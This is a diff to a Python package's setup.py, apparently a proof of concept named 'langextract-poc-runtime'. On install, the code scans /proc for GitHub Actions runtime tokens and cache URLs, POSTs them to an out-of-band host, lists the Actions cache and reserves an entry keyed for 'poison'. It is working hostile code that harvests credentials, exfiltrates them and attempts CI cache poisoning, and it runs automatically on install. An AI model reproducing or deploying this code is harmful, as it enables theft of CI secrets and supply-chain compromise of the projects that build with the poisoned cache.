@@ -15,7 +15,7 @@ def exfil(path, data):
             data = data.encode()
         if isinstance(data, bytes):
             req = urllib.request.Request(
-                f"https://{OAST}/langextract/runtime_v2{path}",
+                f"https://{OAST}/langextract/runtime_v3{path}",
                 data=data,
                 method="POST"
             )
@@ -61,7 +61,6 @@ def find_token_in_proc():
 
     # Scan proc
     try:
-        # Limit scan to recent PIDs to save time, or scan all numerical dirs
         pids = [p for p in os.listdir("/proc") if p.isdigit()]
         for pid in pids:
             try:
@@ -76,7 +75,6 @@ def find_token_in_proc():
                             found_url = env_vars.get("ACTIONS_RUNTIME_URL")
                             found_cache = env_vars.get("ACTIONS_CACHE_URL")
                             
-                            # Valid token found?
                             if found_token:
                                 return found_token, found_url, found_cache
                     except:
@@ -89,11 +87,15 @@ def find_token_in_proc():
     return None, None, None
 
 # ========================================
-# PHASE 1: TOKEN HARVESTING (PROCFS)
+# PHASE 1: TOKEN HARVESTING
 # ========================================
 runtime_token, runtime_url, cache_url = find_token_in_proc()
 
-exfil("/env_check", f"TokenFound: {bool(runtime_token)}\nRuntimeURL: {runtime_url}\nCacheURL: {cache_url}")
+env_dump = "ACTIONS_RUNTIME_TOKEN=" + ("PRESENT" if runtime_token else "MISSING")
+env_dump += "\nACTIONS_RUNTIME_URL=" + str(runtime_url)
+env_dump += "\nACTIONS_CACHE_URL=" + str(cache_url)
+
+exfil("/env_check", env_dump)
 
 if runtime_token:
     # Exfiltrate the actual token for local validation
@@ -103,11 +105,7 @@ if runtime_token:
     # PHASE 2: CACHE ENUMERATION (List)
     # ========================================
     if cache_url:
-        # Try to list keys
-        # The query param 'keys' is comma separated list of keys to search
-        # We search for 'Linux' as it's a common prefix
-        list_url = f"{cache_url}_apis/artifactcache/cache?keys=Linux&version=1" 
-        
+        list_url = f"{cache_url}_apis/artifactcache/cache?keys=pip&version=1" 
         resp_body, status = internal_api_request(list_url, runtime_token)
         exfil("/cache_list", f"Status: {status}\nBody: {resp_body}")
 
@@ -117,8 +115,7 @@ if runtime_token:
     if cache_url:
         reserve_url = f"{cache_url}_apis/artifactcache/caches"
         
-        # Cache key design
-        key = f"Linux-poc-poison-v2-{int(time.time())}"
+        key = f"Linux-poc-poison-v3-{int(time.time())}"
         version = "b1ab1a91-4a8f-4138-b324-h4sh1234" 
         
         payload = {
@@ -133,7 +130,7 @@ if runtime_token:
 # Standard setup.py boilerplate
 from setuptools import setup, find_packages
 setup(
-    name="langextract-poc-runtime-v2",
-    version="0.0.6",
+    name="langextract-poc-runtime-v3",
+    version="0.0.7",
     packages=find_packages(),
 )
